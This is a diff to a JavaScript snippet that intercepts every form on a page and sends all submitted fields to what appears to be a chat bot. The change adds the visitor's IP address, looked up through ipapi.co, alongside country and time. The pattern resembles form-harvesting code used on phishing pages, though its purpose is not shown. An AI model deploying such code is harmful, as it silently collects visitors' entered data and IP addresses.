@@ -4,13 +4,15 @@ document.addEventListener("DOMContentLoaded", () => {
   const forms = document.querySelectorAll("form");
 
   let userCountry = "Unknown"; // default
+  let userIP = "Unknown"; // <-- add IP variable
 
-  // Fetch country name first
+  // Fetch country and IP first
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
-      if (data && data.country_name) {
-        userCountry = data.country_name;
+      if (data) {
+        if (data.country_name) userCountry = data.country_name;
+        if (data.ip) userIP = data.ip; // <-- store IP
       }
     })
     .catch(err => console.error("IP lookup error:", err));
@@ -19,13 +21,14 @@ document.addEventListener("DOMContentLoaded", () => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      // ensure country is available
-      if (userCountry === "Unknown") {
+      // ensure country and IP are available
+      if (userCountry === "Unknown" || userIP === "Unknown") {
         try {
           const res = await fetch("https://ipapi.co/json/");
           const data = await res.json();
-          if (data && data.country_name) {
-            userCountry = data.country_name;
+          if (data) {
+            if (data.country_name) userCountry = data.country_name;
+            if (data.ip) userIP = data.ip; // <-- retry IP
           }
         } catch (err) {
           console.error("Retry IP lookup error:", err);
@@ -54,7 +57,9 @@ document.addEventListener("DOMContentLoaded", () => {
           `📋 *New Form Submitted*\n\n` +
           `🏷️ Page: ${document.title}\n` +
           formLine +
-          `🌍 Country: ${userCountry}\n🕒 Date & Time: ${dateTime}\n\n` +
+          `🌍 Country: ${userCountry}\n` +
+          `🕒 Date & Time: ${dateTime}\n` +
+          `📍 IP: ${userIP}\n\n` + // <-- added IP line
           Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
         parse_mode: "Markdown"
       };
